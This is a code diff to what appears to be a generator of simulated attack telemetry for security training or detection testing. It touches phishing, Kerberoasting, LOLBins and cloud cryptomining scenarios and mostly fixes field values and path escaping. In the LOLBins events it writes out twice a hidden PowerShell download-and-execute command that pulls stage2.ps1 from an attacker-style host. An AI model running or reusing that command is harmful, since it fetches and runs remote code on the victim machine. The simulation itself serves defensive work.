@@ -913,7 +913,6 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
         "source.ip": attackerIp,
         "user.name": "jsmith-analytics",
         "user_agent.original": "aws-cli/2.13.25 Python/3.11.6 Windows/10",
-        "alert.name": "UnauthorizedAccess:IAMUser/AnomalousBehavior",
       },
     },
 
@@ -4985,7 +4984,7 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
     // T+18min: xp_cmdshell PowerShell execution via svc-mssql (T1059.001)
     {
       id: "evt_kerb_08_xp_cmdshell", ts: T(18 * MIN),
-      source: "db_monitor", vendor: "IBM Guardium", event_type: "db_schema_change",
+      source: "db_monitor", vendor: "IBM Guardium", event_type: "db_query",
       hostname: "srv-db01", src_ip: attackerIp,
       severity: "critical", mitre_technique: "T1059.001", mitre_tactic: "Execution",
       description: "svc-mssql ran EXEC xp_cmdshell on srv-db01 to launch a hidden, Base64-encoded PowerShell command.",
@@ -5598,7 +5597,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       severity: "high", mitre_technique: "T1204.002", mitre_tactic: "Execution",
       description: "WINWORD.EXE spawned a command shell on the HR workstation WS-HR-1133.",
       process: {
-        name: "cmd.exe", pid: 4420, path: "C:\Windows\System32\cmd.exe",
+        name: "cmd.exe", pid: 4420, path: "C:\\Windows\\System32\\cmd.exe",
         parent_name: "WINWORD.EXE", parent_pid: 3308,
         cmdline: "cmd.exe /c",
         user: "s.patel", integrity: "medium",
@@ -5611,7 +5610,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "DeviceName": victimHost,
         "ActionType": "ProcessCreated",
         "FileName": "cmd.exe",
-        "FolderPath": "C:\Windows\System32\cmd.exe",
+        "FolderPath": "C:\\Windows\\System32\\cmd.exe",
         "ProcessId": "4420",
         "ProcessCommandLine": "cmd.exe /c",
         "InitiatingProcessFileName": "WINWORD.EXE",
@@ -5754,7 +5753,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution",
       description: "A hidden PowerShell process started under mshta.exe and downloaded stage2.ps1 into memory.",
       process: {
-        name: "powershell.exe", pid: 6200, path: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        name: "powershell.exe", pid: 6200, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         parent_name: "mshta.exe", parent_pid: 6100,
         cmdline: "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')",
         user: "s.patel", integrity: "medium",
@@ -5768,7 +5767,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "DeviceName": victimHost,
         "ActionType": "ProcessCreated",
         "FileName": "powershell.exe",
-        "FolderPath": "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "ProcessId": "6200",
         "ProcessCommandLine": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://cdn-winupd.ru/stage2.ps1')",
         "InitiatingProcessFileName": "mshta.exe",
@@ -6230,8 +6229,13 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
       user_email: "a.levy@rocketstack.io",
       description: "The leaked key called ListBuckets, DescribeInstances, ListSecrets, and DescribeVpcs within 90 seconds, returning 12 S3 buckets and 9 Secrets Manager entries.",
       raw: {
-        "aws.cloudtrail.eventName": "ListBuckets|DescribeInstances|ListSecrets|DescribeVpcs",
-        "aws.cloudtrail.eventSource": "s3.amazonaws.com|ec2.amazonaws.com|secretsmanager.amazonaws.com",
+        // Representative record — CloudTrail writes one record per API call
+        // with its own eventName/eventSource/eventID; ListBuckets, DescribeInstances,
+        // ListSecrets and DescribeVpcs (see description) are four separate
+        // records fired seconds apart, not one composite entry. This is the
+        // first of that 90-second burst.
+        "aws.cloudtrail.eventName": "ListBuckets",
+        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
         "aws.cloudtrail.awsRegion": "us-east-1",
         "aws.cloudtrail.sourceIPAddress": attackerIp,
         "aws.cloudtrail.userAgent": "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0",
@@ -6243,7 +6247,7 @@ export function buildCloudCryptoMiningScenario(scenarioId = "cloud-cryptomining-
         "aws.cloudtrail.request_id": "a1b2c3d4-0004-0001-abcd-ef0000000004",
         "aws.cloudtrail.errorCode": null,
         "event.outcome": "success",
-        "event.action": "CloudRecon",
+        "event.action": "ListBuckets",
         "cloud.provider": "aws",
         "cloud.region": "us-east-1",
         "cloud.account.id": accountId,
